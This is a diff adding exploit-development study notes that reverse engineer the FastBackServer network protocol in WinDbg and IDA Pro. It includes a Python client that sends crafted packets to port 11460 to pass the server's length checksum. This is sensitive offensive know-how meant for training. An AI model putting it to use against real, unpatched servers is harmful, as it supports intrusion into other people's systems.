@@ -2522,7 +2522,7 @@ The main disassembly window can show the code organized in three 3 different way
 
 The **green and red arrows** originating from a **conditional branch** indicate if the condition was met or not respectively - like if and else in low level languages like C or C++.
 
-**Blue arrows** represent basic block edges, where only one potential successor block is present (JMP assembly instruction).
+**Blue arrows** represent basic block edges, where only one potential successor block is present (`JMP` assembly instruction).
 
 Reposition the graph while analyzing a selected function by clicking and dragging the background of the `graph` view.
 
@@ -6520,89 +6520,2647 @@ The return value we got is not `NULL`. This indicates that the call was successf
 
 # Reverse Engineering for Bugs
 
+## Interacting with Tivoli Storage Manager
+
+### Hooking the recv API
+
+`bp wsock32!recv`
+
+`g`
+
+```python
+import socket
+import sys
+
+buf = bytearray([0x41]*100)
+
+def main():
+	if len(sys.argv) != 2:
+		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
+		sys.exit(1)
+	
+	server = sys.argv[1]
+	port = 11460
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((server, port))
+
+	s.send(buf)
+	s.close()
+
+	print("[+] Packet sent")
+	sys.exit(0)
 
 
+if __name__ == "__main__":
+ 	main()
+```
+
+```c
+int recv(
+  SOCKET s,
+  char   *buf,
+  int    len,
+  int    flags
+);
+```
+
+`dd esp L5`
+
+```
+0d85fb58  00581ae8 00000b6c 00df8058 00004400
+0d85fb68  00000000
+```
+
+`pt`
+
+```
+eax=00000064
+WSOCK32!recv+0x5b:
+67e71eeb c21000          ret     10h
+```
+
+`? 0x64`
+
+```
+Evaluate expression: 100 = 00000064
+```
+
+The result is `0x64` - decimal value of 100, which is exactly the length of the data we sent.
+
+Dump the content of the input buffer.
+
+`dd 00df8058`
+
+```
+00df8058  41414141 41414141 41414141 41414141
+00df8068  41414141 41414141 41414141 41414141
+00df8078  41414141 41414141 41414141 41414141
+00df8088  41414141 41414141 41414141 41414141
+00df8098  41414141 41414141 41414141 41414141
+00df80a8  41414141 41414141 41414141 41414141
+00df80b8  41414141 00000000 00000000 00000000
+00df80c8  00000000 00000000 00000000 00000000
+```
+
+### Synchronizing WinDbg and IDA Pro
+
+`k`
+
+```
+ # ChildEBP RetAddr  
+00 0d85fe94 0058164e WSOCK32!recv+0x5b
+01 0d85feb0 005815d3 FastBackServer!FX_AGENT_CopyReceiveBuff+0x18
+02 0d85fec0 00581320 FastBackServer!FX_AGENT_GetData+0xd
+03 0d85fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0xd0
+04 0d85ff48 006693e9 FastBackServer!ORABR_Thread+0xef
+05 0d85ff80 76f19564 FastBackServer!_beginthreadex+0xf4
+06 0d85ff94 7700293c KERNEL32!BaseThreadInitThunk+0x24
+07 0d85ffdc 77002910 ntdll!__RtlUserThreadStart+0x2b
+08 0d85ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
+```
+
+`lm m fastbackserver`
+
+To examine `FastBackServer.exe` in IDA Pro, copy it to our Kali machine.
+
+When loading `FastBackServer.exe` in IDA Pro, we will be prompted for the location of multiple imported DLLs.
+
+Cancel out of these prompts as we won't need these modules for our analysis.
+
+`p`
+
+```
+FastBackServer!FX_AGENT_Receive+0x1e2:
+00581ae8 8945f8          mov     dword ptr [ebp-8],eax ss:0023:0d6dfe8c=00000001
+```
+
+Search in IDA Pro for the `FX_AGENT_Receive` function through `Jump > Jump to function....`.
+
+Right-click any function name to enter a `Quick filter` with the name of the function we are searching for:
+
+```
+eax=00000064
+FastBackServer!FX_AGENT_Receive+0x1e5:
+00581aeb 837df8ff        cmp     dword ptr [ebp-8],0FFFFFFFFh ss:0023:0d85fe8c=00000064
+```
+
+`p`
+
+```
+FastBackServer!FX_AGENT_Receive+0x1e9:
+00581aef 7525            jne     FastBackServer!FX_AGENT_Receive+0x210 (00581b16) [br=1]
+```
+
+The instruction ends with `[br=1]` => The branch result before the instruction is executed.
+
+`1` indicates that the jump will be taken (`0` would indicate the opposite condition).
+
+`r zf`
+
+```
+zf=0
+```
+
+`p`
+
+```
+FastBackServer!FX_AGENT_Receive+0x210:
+00581b16 837df800        cmp     dword ptr [ebp-8],0  ss:0023:0d85fe8c=00000064
+```
+
+`EAX` is compared to `0`. Zero would mean that the `recv` call succeeded but no data was received.
+
+`EAX = 0x64` and the Zero Flag is not set => The jump `jnz` is taken.
+
+```C
+char* buf[0x4400];
+DWORD result = recv(s,buf,0x4400,0)
+if(result != SOCKET_ERROR)
+{
+  if(result != 0)
+  {
+    // Do something
+  }
+}
+```
+
+### Checksum, Please
+
+Following the `JNZ`, there is a call to the `PERFMON_S_UpdateCounter` function.
+
+When reverse engineering, not every code path or "rabbit hole" needs to be followed.
+
+Determine if a call is relevant by placing a **hardware breakpoint** on the buffer we are tracing, and then stepping over the call.
+
+- If the breakpoint is not triggered, interpret it as irrelevant and continue.
+
+- If it is triggered, resend our payload and step into the call.
+
+Using a hardware breakpoint triggered by **read** access on our input buffer.
+
+Our input buffer is stored at `0x00df8058`:
+
+```
+FastBackServer!FX_AGENT_Receive+0x24a:
+00581b50 e826d4f0ff      call    FastBackServer!PERFMON_S_UpdateCounter (0048ef7b)
+```
+
+`ba r1 00df8058`
+
+`p`
+
+```
+eax=00000001
+FastBackServer!FX_AGENT_Receive+0x24f:
+00581b55 83c408          add     esp,8
+```
+
+`bc *`
+
+Step over the call to `PERFMON_S_UpdateCounter` to find that nothing happened.
+
+=> The code inside the function did not interact with our buffer.
+
+=> Assume that we don't need to trace this call and move forward.
+
+```nasm
+call    FastBackServer!PERFMON_S_UpdateCounter
+add     esp,8
+mov     ecx,dword ptr [ebp+8]
+mov     edx,dword ptr [ebp-8]
+mov     dword ptr [ecx+28h],edx
+mov     eax,1
+mov     esp,ebp
+pop     ebp
+ret
+```
+
+`EAX` always acts as the return value for a function.
+
+=>`EAX` being set to `1` => The function succeeded without errors.
+
+The stack pointer is restored, and we return into the calling function, i.e., the function that invoked the `recv` call `FastBackServer!FX_AGENT_Receive` is now complete.
+
+`pt`
+
+```
+eax=00000001
+FastBackServer!FX_AGENT_Receive+0x263:
+00581b69 c3              ret
+```
+
+`p`
+
+```
+eax=00000001
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x18:
+0058164e 83c404          add     esp,4
+```
+
+We arrive inside the `FX_AGENT_CopyReceiveBuff` function at offset `0x18`.
+
+```nasm
+add     esp,4
+mov     dword ptr [ebp-8],eax
+cmp     dword ptr [ebp-8],0
+jnz     FastBackServer!FX_AGENT_CopyReceiveBuff+0x38 (0058166e)
+```
+
+If the debugging session is **paused** for an extended period without executing any instructions, the OS can kill the thread with the  message `WARNING: Step/trace thread exited` if we try performing any actions. => Shut down WinDbg and restart our debugging session.
+
+The first conditional branch: Since `EAX` contains the return value of "1", the Zero Flag is not set and the `JNZ` will be taken.
+
+```
+eax=00000001
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x1e:
+00581654 837df800        cmp     dword ptr [ebp-8],0  ss:0023:0d84fea8=00000001
+```
+
+To help speed up our reverse engineering process, place a hardware breakpoint on our input buffer and letting the execution continue.
+
+`ba r1 00df8058`
+
+`g`
+
+```
+Breakpoint 1 hit
+eax=41414141
+FastBackServer!memcpy+0x130:
+00666f70 89448ffc        mov     dword ptr [edi+ecx*4-4],eax ds:0023:00dfc458=00000000
+```
+
+`bc *`
+
+Our breakpoint was hit inside the `memcpy` function. This is a **statically linked** version from the C runtime library.
+
+Dump the call stack => The `memcpy` function was called from the function we are currently reversing.
+
+`k`
+
+```
+ # ChildEBP RetAddr  
+00 0d85fe8c 005816ea FastBackServer!memcpy+0x130
+01 0d85feb0 005815d3 FastBackServer!FX_AGENT_CopyReceiveBuff+0xb4
+02 0d85fec0 00581320 FastBackServer!FX_AGENT_GetData+0xd
+03 0d85fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0xd0
+04 0d85ff48 006693e9 FastBackServer!ORABR_Thread+0xef
+05 0d85ff80 76f19564 FastBackServer!_beginthreadex+0xf4
+06 0d85ff94 7700293c KERNEL32!BaseThreadInitThunk+0x24
+07 0d85ffdc 77002910 ntdll!__RtlUserThreadStart+0x2b
+08 0d85ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
+```
+
+The address offset shown in the call stack is the **return address**. Based on the size of the `call` instruction, the address of the `call` comes `5` bytes prior:
+
+`u FastBackServer!FX_AGENT_CopyReceiveBuff+0xb4 - 5 L1`
+
+```
+FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf:
+005816e5 e856570e00      call    FastBackServer!memcpy (00666e40)
+```
+
+Return execution to `FX_AGENT_CopyReceiveBuff` just before it performs the copy operation.
+
+Reset our debugging session by removing all breakpoints
+
+`bc *`
+
+Setting a new breakpoint on `FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf`, and re-running our PoC.
+
+`bp FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf`
+
+`g`
+
+```
+FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf:
+005816e5 e856570e00      call    FastBackServer!memcpy (00666e40)
+```
+
+`dd esp L3`
+
+```
+0db5fe94  050fc458 050f8058 00000004
+```
+
+```C
+void *memcpy(void *str1, const void *str2, size_t n)
+```
+
+The function copies data from the address of the 2nd argument to the address of the 1st argument.
+
+`dd 050f8058`
+
+```nasm
+050f8058  41414141 41414141 41414141 41414141
+050f8068  41414141 41414141 41414141 41414141
+050f8078  41414141 41414141 41414141 41414141
+050f8088  41414141 41414141 41414141 41414141
+050f8098  41414141 41414141 41414141 41414141
+050f80a8  41414141 41414141 41414141 41414141
+050f80b8  41414141 00000000 00000000 00000000
+```
+
+`memcpy` will copy the first 4 bytes from our input buffer into a 2nd buffer.
+
+Applications often perform some verification or checksum on the entire input buffer
+
+=> Step over the `memcpy` call and return to IDA Pro to identify the destination buffer.
+
+```nasm
+lea     eax,[edx+ecx+4438h]
+push    eax
+call    FastBackServer!memcpy
+add     esp,0Ch
+```
+
+The destination buffer is at the static offset `0x4438` from `EDX + ECX` (`050fc458`)
+
+Note down this **offset** to recognize if the destination buffer is used in other basic blocks within the function we are analyzing.
+
+This offset is used in the basic block starting at address `0x581752`.
+
+```nasm
+mov     edx,dword ptr [ebp+8]
+mov     eax,dword ptr [edx+4438h]
+and     eax,0FFh
+shl     eax,18h
+```
+
+The endianness of the DWORD copied to the destination buffer is switched, i.e. the order of each individual byte is reversed.
+
+Applications often reverse the endianness of data when parsing input. This can be done by calling a function, or directly in-line, as in this case.
+
+`? 0x41414141 & 0xFF`
+
+```
+Evaluate expression: 65 = 00000041
+```
+
+`? 0x41 << 0x18`
+
+```
+Evaluate expression: 1090519040 = 41000000
+```
+
+When the calculations are finished, the lowermost byte becomes the uppermost byte. The same process is applied to all 4 bytes by using different shift lengths until the order is reversed.
+
+E.g., For `0x41424344`, the final result would be `0x44434241`.
+
+At the end of the basic block, the modified DWORD stored in `EAX` overwrites the original value in the destination buffer `[ecx+4438h]`.
+
+```nasm
+mov     ecx,dword ptr [ebp+8]
+mov     dword ptr [ecx+4438h],eax
+mov     edx,dword ptr [ebp+8]
+cmp     dword ptr [edx+4438h],0
+jnz     FastBackServer!FX_AGENT_CopyReceiveBuff+0x18e
+```
+
+A comparison is performed between the modified DWORD and the value `0`. If the DWORD is not zero, the execution flow continues to:
+
+```nasm
+mov     eax,dword ptr [ebp+8]
+cmp     dword ptr [eax+4438h],0
+jl      FastBackServer!FX_AGENT_CopyReceiveBuff+0x1a9
+```
+
+`JL` is taken when the 1st operand is less than the 2nd, taking into account the sign of the operands (**signed** operation).
+
+The CPU recognizes a value as positive or negative based on its higher-most bit, which is also called the **sign bit**.
+
+Convert the value `0x41414141` to binary:
+
+`.formats 0x41414141`
+
+```
+Evaluate expression:
+  Hex:     41414141
+  Decimal: 1094795585
+  Octal:   10120240501
+  Binary:  01000001 01000001 01000001 01000001
+  Chars:   AAAA
+```
+
+The highest bit in the binary representation of `0x41414141` is 0. => A positive value in a signed arithmetic operation.
+
+The `CMP` instruction subtracts the second operand from the first, in our case `0` from our input DWORD `0x41414141`.
+
+- The result of this operation is still `0x41414141`.
+
+- `0x41414141` has the sign bit unset => the `SF` won't be set.
+
+- Since `0` and `0x41414141` both have positive signs, the `OF` flag won't be set either.
+
+(`OF` flag is set when the **sign** bit is changed as the result of adding two numbers with the same sign or subtracting two numbers with opposite signs.)
+
+The `JL` is taken only if the Sign flag and the Overflow flag are different.
+
+=> `JL` is not taken.
+
+```nasm
+mov     ecx,dword ptr [ebp+8]
+cmp dword ptr [ecx+4438h],100000h
+jbe     FastBackServer!FX_AGENT_CopyReceiveBuff+0x1b0
+```
+
+The `JBE` jump is taken if the 1st operand is less than or equal to the 2nd and it's an **unsigned** operation.
+
+The instruction checks if the Carry flag (`CF`) or the Zero flag (`ZF`) are set by the `CMP` instruction preceding the jump.
+
+- Our DWORD would have to contain the value `0x100000` to set the Zero flag, or a smaller value to set the Carry flag.
+
+=> If we want to take this jump, our DWORD needs to be <= `0x100000`.
+
+Note: 
+
+- "above" (JA, JAE) and "below" (JB, JBE) in conditional jumps are used while comparing unsigned integers.
+
+- "less" (JL, JLE) and "greater" (JG, JGE) are used for comparisons of signed integers.
+
+```
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d:
+005817d3 81b93844000000001000 cmp dword ptr [ecx+4438h],100000h ds:0023:050fc458=41414141
+```
+
+`p`
+
+```
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x1a7:
+005817dd 7607            jbe     FastBackServer!FX_AGENT_CopyReceiveBuff+0x1b0 (005817e6) [br=0]
+```
+
+The `JBE` is not going to be taken because our input value of `0x41414141` > `0x100000`.
+
+Notice:
+
+- The `JBE` would take us toward the bottom left, while most of the code is on the bottom right.
+
+- The code on the right includes a `memcpy` call that might be worth investigating.
+
+- The second-to-last basic block on this execution path on the right: moving the value `1` into `EAX`. 
+
+=> To analyze the `memcpy` and return successfully from this function, take the `JBE` at `0x5817DD`.
+
+To trigger the `JBE`, update our PoC and set the DWORD value to `0x1234`, which is < `0x100000`.
+
+The endianness of our first DWORD is inverted before being parsed. =>  Supply the value as **big-endian** in our Python code to obtain the correct format inside the application.
+
+```python
+import socket
+import sys
+from struct import pack
+
+buf = pack(">i", 0x1234)
+buf += bytearray([0x41]*100)
+...
+```
+
+The `pack` function accepts 2 arguments: a format string and the value to pack.
+
+- `>` character for big endian
+
+- `i` character for 32-bit integer in the format string argument.
+
+Remove our existing breakpoints in WinDbg and set a new breakpoint on the comparison against `0x100000`:
+
+`bc *`
+
+`bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d`
+
+`g`
+
+```
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d:
+005817d3 81b93844000000001000 cmp dword ptr [ecx+4438h],100000h ds:0023:00dfc458=00001234
+```
+
+`p`
+
+```
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x1a7:
+005817dd 7607            jbe     FastBackServer!FX_AGENT_CopyReceiveBuff+0x1b0 (005817e6) [br=1]
+```
+
+The jump will be taken this time.
+
+Recap: The 1st DWORD is checked in little-endian format and must be between `0` and `0x100000`.
+
+The 1st DWORD is found again in a basic block a bit further down (`0x58181A`)
+ 
+```nasm
+mov     edx,dword ptr [ebp+8]
+mov     eax,dword ptr [edx+4438h]
+add     eax,dword ptr [FastBackServer!FX_AGENT_dwHeaderLength (0085eb90)]
+mov     edx,dword ptr [ebp+8]
+sub     eax,dword ptr [edx+20h]
+cmp     ecx,eax
+jae     FastBackServer!FX_AGENT_CopyReceiveBuff+0x20b (00581841)
+```
+
+```
+ecx=00000064
+0058181a 8b8238440000    mov     eax,dword ptr [edx+4438h] ds:0023:00dfc458=00001234
+```
+
+`p`
+
+```
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x1ea:
+00581820 030590eb8500    add     eax,dword ptr [FastBackServer!FX_AGENT_dwHeaderLength (0085eb90)] ds:0023:0085eb90=00000004
+```
+
+`p`
+
+```
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f0:
+00581826 8b5508          mov     edx,dword ptr [ebp+8] ss:0023:0dc5feb8=00df8020
+```
+
+`p`
+
+```
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f3:
+00581829 2b4220          sub     eax,dword ptr [edx+20h] ds:0023:00df8040=00000004
+```
+
+The contents of the `FX_AGENT_dwHeaderLength` global variable are added to our DWORD, followed by a subtraction of the 4-byte value stored at offset `0x20` from `EDX`. Both of these values are `4` => not change the value of our input DWORD.
+
+`p`
+
+```
+ecx=00000064
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6:
+0058182c 3bc8            cmp     ecx,eax
+```
+
+`r eax`
+
+```
+eax=00001234
+```
+
+At the end of the execution, a comparison between our first `0x1234` DWORD and the value `0x64`.
+
+The input length of the rest of the buffer is `0x64` bytes (decimal `100`)
+
+=> The application seems to be comparing the 1st DWORD of our data with the size of our input buffer, not counting the 1st DWORD.
+
+=> Assume that the value of the 1st DWORD must match the size of the input buffer and acts as a basic checksum to verify that all data was received by the application.
+
+A complete analysis of this function and its parent would reveal that the application can handle **fragmented TCP packets**.
+
+In theory, we could use a checksum value that differs from the total size of the data sent in the packet. This would require the use of fragmented TCP packets, however, which would complicate the analysis.
+
+Update our PoC by setting the first DWORD to `0x64`, remove all the breakpoints, and set a new breakpoint at the comparison performed.
+
+```python
+import socket
+import sys
+from struct import pack
+
+buf = pack(">i", 0x64)
+buf += bytearray([0x41]*100)
+...
+```
+
+`bc *`
+
+`bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6`
+
+`g`
+
+```
+Breakpoint 0 hit
+eax=00000064 ecx=00000064
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6:
+0058182c 3bc8            cmp     ecx,eax
+```
+
+The breakpoint was hit + the 1st DWORD to match the size of the input buffer. 
+
+```nasm
+mov     eax,dword ptr [ebp+8]
+mov     ecx,dword ptr [eax+4438h]
+add     ecx,dword ptr [FastBackServer!FX_AGENT_dwHeaderLength]
+mov     edx,dword ptr [ebp+8]
+sub     ecx,dword ptr [edx+20h]
+mov     dword ptr [ebp-10h],ecx
+```
+
+The value stored in the `FX_AGENT_dwHeaderLength` global variable is first added to our DWORD. Next, the DWORD stored at offset `0x20` from `EDX` is subtracted. These values haven't changed from the previous block, and they have no net effect on our DWORD.
+
+At the end of the basic block, our DWORD is saved to a stack address, to track that address instead of the one at offset `0x4438`.
+
+The value stored on the stack is immediately used in the next basic block
+
+```nasm
+mov     eax,dword ptr [ebp-10h]
+mov     dword ptr [ebp-4],eax
+mov     ecx,dword ptr [ebp-4]
+push    ecx
+mov     edx,dword ptr [ebp+8]
+mov     eax,dword ptr [edx+2Ch]
+mov     ecx,dword ptr [ebp+8]
+lea     edx,[ecx+eax+38h]
+push    edx
+mov     eax,dword ptr [ebp+8]
+mov     ecx,dword ptr [eax+20h]
+mov     edx,dword ptr [ebp+8]
+lea     eax,[edx+ecx+4438h]
+push    eax
+call    FastBackServer!memcpy (00666e40)
+add     esp,0Ch
+mov     ecx,dword ptr [ebp+8]
+```
+ 
+Another `memcpy` is performed in this block.
+
+```
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x24c:
+00581882 e8b9550e00      call    FastBackServer!memcpy (00666e40)
+```
+
+`dd esp L3`
+
+```
+0dd5fe94  050fc45c 050f805c 00000064
+```
+
+Our 1st DWORD is used as the `size` parameter of `memcpy` (`ecx`).
+
+`dd 050f805c`
+
+```
+050f805c  41414141 41414141 41414141 41414141
+050f806c  41414141 41414141 41414141 41414141
+050f807c  41414141 41414141 41414141 41414141
+050f808c  41414141 41414141 41414141 41414141
+050f809c  41414141 41414141 41414141 41414141
+050f80ac  41414141 41414141 41414141 41414141
+050f80bc  41414141 00000000 00000000 00000000
+050f80cc  00000000 00000000 00000000 00000000
+```
+
+`dd 050f805c - 4 L1`
+
+```
+050f8058  64000000
+```
+
+The second argument (`0x050f805c`) points to our input buffer.
+
+=> Our input buffer, excluding the first DWORD, is going to be copied into another buffer. This new buffer will next be processed by the application.
+
+Step over the `memcpy` call to continue to the second-to-last basic block
+
+```nasm
+mov     eax,1
+```
+
+Recap:
+
+- The first DWORD must be sent in big-endian format and be equal to the size of the rest of the buffer.
+
+- After successful validation, the input buffer is copied for further processing.
+
+
+## Reverse Engineering the Protocol
+
+### Header-Data Separation
+
+The `FX_AGENT_CopyReceiveBuff` function verifies the 1st DWORD as a checksum and copies the remainder of the input buffer into a new location.
+
+Then the function sets the result value in EAX to `1` and returns.
+
+`pt`
+
+```
+eax=00000001
+FastBackServer!FX_AGENT_CopyReceiveBuff+0x29c:
+005818d2 c3              ret
+```
+
+`p`
+
+```
+eax=00000001
+FastBackServer!FX_AGENT_GetData+0xd:
+005815d3 83c404          add     esp,4
+```
+
+The function we return into is called `FX_AGENT_GetData`.
+
+```nasm
+add     esp,4
+mov     dword ptr [ebp-4],eax
+cmp     dword ptr [ebp-4],0
+jnz     FastBackServer!FX_AGENT_GetData+0x4e (00581614)
+```
+
+The return value saved in `EAX` (`1`) is compared against `0`
+
+=> The `JNZ` jump will be taken.
+
+```nasm
+mov     eax,dword ptr [ebp+8]
+push    eax
+call    FastBackServer!FX_AGENT_CheckPacketIsComplete (005818d3)
+add     esp,4
+mov     dword ptr [ebp-4],eax
+cmp     dword ptr [ebp-4],0
+jz      FastBackServer!FX_AGENT_GetData+0x6a (00581630)  
+```
+
+A call to `FX_AGENT_CheckPacketIsComplete`. Given the name, guess that the function will validate that our packet is complete, i.e. All the data has been received.
+
+The call to the `recv` API in `wsock32.dll` is used with a hardcoded size of `0x4400` bytes.
+
+=> Any packet we send that is < `0x4400` bytes will be completely received and the call to `FX_AGENT_CheckPacketIsComplete` should return TRUE, or `1`.
+
+```
+FastBackServer!FX_AGENT_GetData+0x52:
+00581618 e8b6020000      call    FastBackServer!FX_AGENT_CheckPacketIsComplete
+```
+
+`p`
+
+```
+eax=00000001
+FastBackServer!FX_AGENT_GetData+0x57:
+0058161d 83c404          add     esp,4
+```
+
+`EAX` was set to `1`. Then, the return value is compared to `0`.
+
+```nasm
+add     esp,4
+mov     dword ptr [ebp-4],eax
+cmp     dword ptr [ebp-4],0
+jz      FastBackServer!FX_AGENT_GetData+0x6a (00581630)  
+```
+
+The subsequent `JZ` jump is not taken.
+
+```nasm
+mov     eax, 1
+jmp     FastBackServer!FX_AGENT_GetData+0x6c (00581632)
+```
+
+Here, `FX_AGENT_GetData` completes its execution.
+
+```nasm
+mov     esp,ebp
+pop     ebp
+ret
+```
+
+Assume that the application will next process the input data received.
+
+`pt`
+
+```
+FastBackServer!FX_AGENT_GetData+0x6f:
+00581635 c3              ret
+```
+
+`p`
+
+```
+eax=00000001
+FastBackServer!FX_AGENT_Cyclic+0xd0:
+00581320 83c404          add     esp,4
+```
+
+We have returned into the `FX_AGENT_Cyclic` function.
+
+```nasm
+mov     dword ptr [ebp-4],eax
+cmp     dword ptr [ebp-4],0
+jz      FastBackServer!FX_AGENT_Cyclic+0x13c
+```
+
+There is a comparison between the return value of "1" and "0"
+
+=> The `JZ` will **not** be taken and execution will flow to:
+
+```nasm
+mov     edx,dword ptr [ebp+8] ss:0023:0d83fef8=04f96020
+cmp     dword ptr [edx+4438h],0
+jnz     FastBackServer!FX_AGENT_Cyclic+0xf7
+```
+
+A comparison between a DWORD at offset `0x4438` from `EDX` and `0` - the same static offset value that was used to store the checksum in the `FX_AGENT_CopyReceiveBuff` function.
+
+```
+FastBackServer!FX_AGENT_Cyclic+0xdf:
+0058132f 83ba3844000000  cmp     dword ptr [edx+4438h],0 ds:0023:04ffe458=00000064
+```
+
+The `JNZ` is going to be taken.
+
+```nasm
+push    1
+mov     eax,dword ptr [ebp+8]
+mov     ecx,dword ptr [eax+4438h]
+push    ecx
+mov     edx,dword ptr [ebp+8]
+add     edx,443Ch
+push    edx
+mov     eax,dword ptr [ebp+8]
+push    eax
+call    FastBackServer!FXCLI_C_ReceiveCommand (0056a0ef)
+```
+
+The basic block calls into the `FXCLI_C_ReceiveCommand` function.
+ 
+This function name suggests that our input buffer will be used as part of some application functionality.
+
+Observe the arguments being pushed to the stack.
+
+1. The static value `1`, followed by the DWORD at offset `0x4438`, which is the checksum value.
+
+2. Use dynamic analysis to dump the last two arguments from the stack:
+
+```
+FastBackServer!FX_AGENT_Cyclic+0x111:
+00581361 e8898dfeff      call    FastBackServer!FXCLI_C_ReceiveCommand (0056a0ef)
+```
+
+`dd esp L4`
+
+```
+0df0febc  04ffa020 04ffe45c 00000064 00000001
+```
+
+`dd 04ffa020`
+
+```
+04ffa020  0096a318 0096a318 00000000 00000b10
+04ffa030  7ece0002 90b0a8c0 00000000 00000000
+04ffa040  00000068 00000000 00000000 00000000
+04ffa050  00000b14 00000001 64000000 41414141
+04ffa060  41414141 41414141 41414141 41414141
+04ffa070  41414141 41414141 41414141 41414141
+04ffa080  41414141 41414141 41414141 41414141
+04ffa090  41414141 41414141 41414141 41414141
+```
+
+The 1st address seems to contain the original packet we sent, along with its stored meta information.
+
+`dd 04ffe45c`
+
+```
+04ffe45c  41414141 41414141 41414141 41414141
+04ffe46c  41414141 41414141 41414141 41414141
+04ffe47c  41414141 41414141 41414141 41414141
+04ffe48c  41414141 41414141 41414141 41414141
+04ffe49c  41414141 41414141 41414141 41414141
+04ffe4ac  41414141 41414141 41414141 41414141
+04ffe4bc  41414141 00000000 00000000 00000000
+04ffe4cc  00000000 00000000 00000000 00000000
+```
+
+The 2nd memory address seems to contain the input buffer after it is copied to the new memory location.
+
+Before analyzing the content of the function in detail, examine `FXCLI_C_ReceiveCommand` at a high level using the `Graph` overview:
+
+- Multiple branching statements, with the larger basic blocks continuing on the right of the layout.
+
+=> Any important application functionality will be found at the bottom-right side of the graph overview, anything else is a failure condition.
+
+This is confirmed by the basic blocks located at the bottom-left of the function at the addresses `0x056A1A8`, `0x056A144`, and `0x056A11A`, which contain error messages.
+
+Go back to first basic block of `FXCLI_C_ReceiveCommand`:
+
+```nasm
+push    ebp
+mov     ebp,esp
+sub     esp,0Ch
+mov     eax,dword ptr [ebp+0Ch]
+mov     dword ptr [ebp-8],eax
+mov     dword ptr [ebp-0Ch],0
+cmp     dword ptr [ebp+10h],30h
+jz      FastBackServer!FXCLI_C_ReceiveCommand+0xa3 (0056a192)
+```
+
+We find a comparison between the 3rd argument (the checksum value) and the static value `0x30`.
+
+It's the 3rd argument because of the `arg_8` offset labeled (`ebp+10h`)
+
+IDA Pro labels the function arguments using:
+
+- `arg_0` for the first argument
+- `arg_4` for the second argument
+- `arg_8` for the third argument, ...
+
+The checksum value will not be equal to `0x30` and the `JZ` is not going to be taken.
+
+The next basic block does an upper-bound check on the packet size by comparing the checksum value to `0x186A0`:
+ 
+```nasm
+mov     ecx,dword ptr [ebp+10h] ss:0023:0d83fec4=00000064
+sub     ecx,30h
+cmp     ecx,186A0h
+jbe     FastBackServer!FXCLI_C_ReceiveCommand+0x3f
+```
+
+As long as our packet size < `0x186A0`, we will trigger the `JBE` and proceed to the next basic block, which is what we want to do:
+
+```nasm
+push    offset FastBackServer!FXCLI_IF_sAgentsCommandsBufferMemoryPool (0096a320)
+call    FastBackServer!MEM_S_GetChunk
+add     esp,4
+mov     dword ptr [ebp-0Ch],eax
+cmp     dword ptr [ebp-0Ch],0
+jnz     FastBackServer!FXCLI_C_ReceiveCommand+0x69
+```
+ 
+After the `JBE`, the application performs a call to `MEM_S_GetChunk`.
+
+We find that it does not accept any arguments we control => guess that it is not important to reverse engineer.
+
+After the call, the return value is saved on the stack at the offset labeled `Dst` (`-0Ch`).
+
+Due to its name, we suspect that the `MEM_S_GetChunk` function is a memory allocator wrapper used here for the destination buffer.
+
+Inspect the failure branch for this basic block:
+
+```nasm
+push    offset FastBackServer!FX_CLI_JavaVersion+0x2e0 (008568f8)
+call    FastBackServer!PrintToTrace (0048c471)
+```
+ 
+Double-click on the error command that will be printed by the application to reach its address in memory and inspect it:
+
+```
+$SG125464       db 'FXCLI_C_ReceiveCommand: Sorry, cant get psCommandBuffer ',0Ah,0
+                ; DATA XREF: _FXCLI_C_ReceiveCommand+55↑o
+```
+ 
+=> `MEM_S_GetChunk` acts as an allocator and the newly-allocated buffer is named `psCommandBuffer`.
+
+A comparison with `0` checks if the `psCommandBuffer` was successfully allocated.
+ 
+We have no reason to believe that it will fail, so the `JNZ` should be triggered:
+
+```nasm
+push    186A4h
+push    0
+mov     edx,dword ptr [ebp-0Ch]
+push    edx
+call    FastBackServer!memset (00667180)
+add     esp,0Ch
+mov     eax,dword ptr [ebp+10h]
+sub     eax,30h
+mov     ecx,dword ptr [ebp-0Ch]
+mov     dword ptr [ecx],eax
+mov     edx,dword ptr [ebp-0Ch]
+mov     eax,dword ptr [edx]
+push    eax
+mov     ecx,dword ptr [ebp+0Ch]
+add     ecx,30h
+push    ecx
+mov     edx,dword ptr [ebp-0Ch]
+add     edx,4
+push    edx
+call    FastBackServer!memcpy (00666e40)
+add     esp,0Ch
+```
+
+2 API calls in this basic block: `memset` and `memcpy`.
+
+- `Memset` is a common API that sets all bytes of a buffer to a specific value
+
+=> `psCommandBuffer` will have all its bytes set to `0` and from the `memset` 3rd argument, its size seems to be `0x186A4`.
+
+This type of memory initialization is often used to remove any previous content in the buffer before it's used. If initialization is not performed, it may be possible to exploit it in a vulnerability class called **uninitialized memory use**.
+
+- The `memcpy` API performs a copy operation.
+
+Move the execution to just before the `memcpy` call.
+
+```
+0056a18a e8b1cc0f00      call    FastBackServer!memcpy (00666e40)
+```
+
+`dd esp L3`
+
+```
+0df0fe9c  06facc0c 04ffe48c 00000034
+```
+
+`dd 04ffe48c-30`
+
+```
+04ffe45c  41414141 41414141 41414141 41414141
+04ffe46c  41414141 41414141 41414141 41414141
+04ffe47c  41414141 41414141 41414141 41414141
+04ffe48c  41414141 41414141 41414141 41414141
